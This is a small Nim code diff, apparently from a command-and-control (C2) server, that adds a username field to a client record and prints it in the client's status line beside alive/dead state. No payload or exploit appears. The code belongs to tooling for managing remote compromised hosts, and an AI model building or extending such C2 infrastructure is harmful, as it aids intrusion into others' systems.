@@ -9,6 +9,7 @@ type
     # shit
     loaded*: bool
     hostname*: string
+    username*: string
 
   C2Server* = ref object
     socket*: AsyncSocket
@@ -24,4 +25,4 @@ proc `@`*(client: Client): string =
   if not client.loaded:
     $client & "(" & (if client.connected: "alive" else: "dead") & ")"
   else:
-    $client & " (" & (if client.connected: "alive" else: "dead") & ") INITIALIZED"
+    $client & " (" & (if client.connected: "alive" else: "dead") & ") INITIALIZED\n\tUsername: " & client.username
